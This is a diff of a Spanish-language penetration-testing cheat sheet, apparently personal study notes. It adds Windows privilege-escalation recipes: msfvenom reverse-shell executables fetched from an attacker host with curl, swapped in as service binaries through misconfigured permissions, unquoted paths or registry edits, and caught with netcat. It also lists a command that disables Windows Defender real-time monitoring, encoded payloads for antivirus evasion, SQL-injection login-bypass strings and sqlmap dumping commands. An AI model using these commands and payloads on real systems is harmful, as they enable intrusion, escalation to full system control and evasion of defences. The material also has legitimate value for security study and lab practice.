@@ -1,7 +1,5 @@
 FOR LEGAL PURPOSES ONLY:
 
-
-      
       
                        ."-,.__
                        `.     `.  ,
@@ -56,10 +54,6 @@ FOR LEGAL PURPOSES ONLY:
 =========================================================================================
 
 
-
-
-
-
 ===========================
 ===        PORTS        ===
 ===========================
@@ -97,7 +91,6 @@ ________________________________________________________________________________
 8080-81	 HTTP Proxy
 
 
-
 ===========================
 ===     ENUMERATION     ===
 ===========================
@@ -120,7 +113,7 @@ ________________________________________________________________________________
 # Enumera los puertos abiertos
 	sudo nmap -vv -sC -sV -p- [RHOST]
 	sudo nmap -vv -sV -sU [RHOST]   ---   escaneo UDP
-	sudo nmap -vv -T4 -sC -sV --script vuln [RHOST]   ---   busca vuln
+	sudo nmap -vv -T4 -sC -sV --script vuln [RHOST]
 	sudo nmap -vv [rango IP/MS]
 	sudo nmap -vv -sC -sV -p- --scan-delay 5s [RHOST]
 
@@ -176,7 +169,6 @@ ________________________________________________________________________________
 # Lanza un conjunto grande de herramientas para enumeracion (no incluye evasion de firewall)
 	sudo apt install autorecon
 	sudo autorecon [RHOST]
-
 
 
 ===========================
@@ -237,7 +229,6 @@ ________________________________________________________________________________
 	./Win7Blue
 
 
-
 ===========================
 ===      ENCODEAR       ===
 ===========================
@@ -247,7 +238,6 @@ ________________________________________________________________________________
 	msfvenom -p windows/meterpreter/reverse_tcp RHOST=[RHOST] LHOST=[LHOST] LPORT=[4444] -f exe > reverse.exe
 # Payload con endoder:
 	msfvenom -p windows/meterpreter/reverse_tcp RHOST=[RHOST] LHOST=[LHOST] LPORT=[4444] -e x86/shikata-ga-nai -i 250 -f exe > encoded.exe
-
 
 
 ===========================
@@ -318,7 +308,6 @@ ________________________________________________________________________________
 	[PASS_SSH]
 
 
-
 ===========================
 ===      WEB RISKS      ===
 ===========================
@@ -340,7 +329,6 @@ A10:2021-Server-Side Request Forgery*
 	*From the Survey
 
 # https://owasp.org/www-project-top-ten/
-
 
 
 ===========================
@@ -497,7 +485,6 @@ ________________________________________________________________________________
 	wpscan --url [URL] -e vp   ---   enumera plugins vulnerables
 
 
-
 ===========================
 ===   PENTESTING  WEB   ===
 ===========================
@@ -577,7 +564,6 @@ ________________________________________________________________________________
 # Para comprobar si es susceptible a SQLi, lo primero es probar a introducir una comilla simple.
 	'   ---   You have an error in your SQL syntax....
 	'or '1'='1   ---   Te montraria toda la tabla.
-
 # Otras opciones
 	admin' or '1'='1
 	" or "1"="1
@@ -595,7 +581,6 @@ ________________________________________________________________________________
 	") or ("1"="1"/*
 	") or ("1"="1"#
 	) or '1`='1-
-
 # Eludir la autenticación.
 	'-'
 	' '
@@ -634,7 +619,6 @@ ________________________________________________________________________________
 	admin' or 1=1
 	1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 	1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
-
 	' UNION SELECT user, password FROM users#
 	1 or 1=1 UNION SELECT user, password FROM users#
 
@@ -658,7 +642,6 @@ ________________________________________________________________________________
 	sqlmap -r request.req -D [DATABASE-NAME] --tables
 	sqlmap -r request.req -D [DATABASE-NAME] -T [TABLE-NAME] --columns
 	sqlmap -r request.req -D [DATABASE-NAME] -T [TABLE-NAME] -C [DATO1],[DATO2],[DATO3] --dump
-
 # Ex:
 	sqlmap -r request.req -p id --batch --dbs
 	sqlmap -r request.req -D dvwa --tables
@@ -720,9 +703,7 @@ ________________________________________________________________________________
 CPDoS
 _________________________________________________________________________________________
 
-
 # https://cpdos.org/
-
 
 
 ===========================
@@ -739,11 +720,10 @@ ________________________________________________________________________________
 	virtualenv -p python3 venv
 
 
-
 ===========================
 ===  POST EXPLOITATION  ===
 ===========================
-
+ 
 
 PRIVILEGE ESCALATION LINUX
 _________________________________________________________________________________________
@@ -839,46 +819,90 @@ PRIVILEGE ESCALATION WINDOWS
 _________________________________________________________________________________________
 
 # ENUM Manual #
-	hostname
-	whoami
-	whoami /priv	syteminfo
-	ipconfig
-	cmdkey /list
-	icacls
-	schtasks /query
-	schtasks /query /fo LIST /v
-	dir
-	sc
-	set
-	netstat
-	reg /query
-	sc query windefend
-	sc queryex type=service
-	WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
-	netsh advfirewall firewall dump
+	hostname   ---   nombre de la maquina
+	whoami   ---   quien soy
+	whoami /priv   ---   muestra permisos privigeliados que puedes usar
+	syteminfo   ---   saber los parches, OS version, entre otra info de Windows
+	ipconfig   ---   info de las NIC
+	cmdkey /list   ---   ver credenciales guardadas
+	icacls [PATH]   ---   saber el permiso sobre una ruta
+	schtasks /query   ---   
+	schtasks /query /fo LIST /v   ---   ver tareas programadas
+	dir   ---   listar
+	sc   ---   
+	set   ---   
+	netstat   ---   
+	reg /query   ---   
+	sc query windefend   ---   
+	sc queryex type=service   ---   	
+	netsh advfirewall firewall dump   ---   dumpear si tiene firewall o antivirus
 	Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+	WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName   ---   enumera antivirus
 *Probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros: 
 "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
+# LISTA DE PERMISOS # https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 
-# ENUM Auto #
-	WinPEAS
-
-
-
+# ENUM Auto # WinPEAS	
+	cd /usr/share/peass/WinPEAS
 
 
+# INSECURE SERVICE PERMISSIONS # Permisos inseguros en servicios. Preguntar servicio y el programa
+	sc qc daclsvc
+		BINARY_PATH_NAME: "C:\Program Files\DACL Service\daclservice.exe"
+		LocalSystem
+# Enumerar los permisos en el servicio
+	C:\PrivEsc\accesschk.exe /accepteula -uwcqv [USER] [servicio]	
+	C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc   ---   enumera los permisos del servicio
+		SERVICE_CHANGE_CONFIG
+# Aprovechando este error, crear una reverse shell en Kali
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP KALI] LPORT=[PORT] -f exe -o reverse.exe
+	PYTHON3 -M HTTP.SERVER 8080
+# Target coger la reverse y cambiar el BINARY_PATH_NAME
+	curl -O http://[IP KALI]:[PORT]/reverse.exe
+	sc config daclsvc binpath= "\"C:\Users\user\reverse.exe\""
+# Kali
+	nc -lvnp 4444
+# Target
+	net start daclsvc
 
 
+# UNQUOTED SERVICE PATH # Rutas de servicio estando sin comillas. Preguntar servicio y el programa
+	sc qc unquotedsvc
+		BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+# Enumerar los permisos en el servicio
+	C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+# Aprovechando los permisos RW a partir de Common Files, pasar un reverse shell llamada common.exe
+	copy C:\Users\user\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+# Tambien se puede cambiar el nombre a mano
+	ren reverse.exe Common.exe
+# Kali
+	nc -lvnp 4444
+# Target
+	net start unquotedsvc
 
 
+# WEAK REGISTRY PERMISSIONS # Si se puede leer y escribir en el registro. Preguntar servicio y el programa
+	sc qc regsvc
+# Enumerar los permisos en el servicio
+	C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+# Cambiar la ruta del registro
+	reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\user\reverse.exe /
+# Kali
+	nc -lvnp 4444
+# Target
+	net start regsvc
 
 
-
-
-
-
-
-
+# INSECURE SERVICE EXECUTABLES # Ejecutables mal configurados en servicios. Preguntar servicio y el programa
+	sc qc filepermsvc
+# Enumerar los permisos en el servicio
+	C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+# Ver que cualquiera tiene permiso de RW. Proceder a cambiar el .exe por nuestro reverse
+	copy C:\Users\user\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+# Kali
+	nc -lvnp 4444
+# Target
+	net start filepermsvc
 
 
 ACTIVE DIRECTORY
@@ -895,7 +919,7 @@ ________________________________________________________________________________
 	ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)"   ---   descubrir el DC por medio de ldap
 
 
-PERSISTENCE (BACK DOOR)
+PERSISTENCE
 _________________________________________________________________________________________
 
 # CAPABILITIES # Metodo de persistencia, solo desde ROOT, escalamos privilegios colocando una capability 
@@ -916,6 +940,19 @@ EXTRACT CREDENTIALS
 _________________________________________________________________________________________
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
 PIVOTING
 _________________________________________________________________________________________
 
@@ -930,7 +967,7 @@ strings imagen.png   ---   sacar los strings, texto, datos ocultos de una imagen
 BORRAR HUELLAS
 _________________________________________________________________________________________
 
-
+#
 
 
 ===========================
@@ -966,7 +1003,7 @@ ________________________________________________________________________________
 	ex: wget http://10.10.120.64:8080/LinPEAS.sh
          
 # Target Windows
-	curl -O http://[IP]/[FILE]
+	curl -O http://[IP]:[PORT]/[FILE]
 	certutil.exe -f -urlcache -split "http://[LHOST]/[FILE]" [FILE]
 	powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
 	Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
@@ -1031,7 +1068,6 @@ ________________________________________________________________________________
 	ex: pip install -r requirements.txt
 # Desactivar el entorno virtual
 	deactivate
-
 
 
 ===========================
@@ -1100,12 +1136,9 @@ Ctrl X
 # Refrescar https://ipleak.net/ debe salir: "No leak, RTCPeerConnection not available."
 
 
-
 ===========================
 ===     COMMAND ATT     ===
 ===========================
-
-
 
 _________________________________________________________________________________________
 
